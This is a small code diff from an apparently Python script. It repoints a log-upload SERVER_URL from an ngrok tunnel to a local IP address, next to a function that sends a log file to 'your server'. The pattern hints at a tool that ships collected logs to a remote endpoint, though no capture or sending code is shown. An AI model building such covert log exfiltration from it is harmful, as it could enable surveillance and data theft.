@@ -12,7 +12,7 @@ logging.basicConfig(
 )
 
 # Replace with your ngrok public URL
-SERVER_URL = "https://your-ngrok-url.ngrok.io/upload"  # Replace with your actual ngrok URL
+SERVER_URL = "http://192.168.137.1:5000"  # Replace with your actual ngrok URL or temporary python sever address
 
 # Function to send the log file to your server
 def send_log_file():
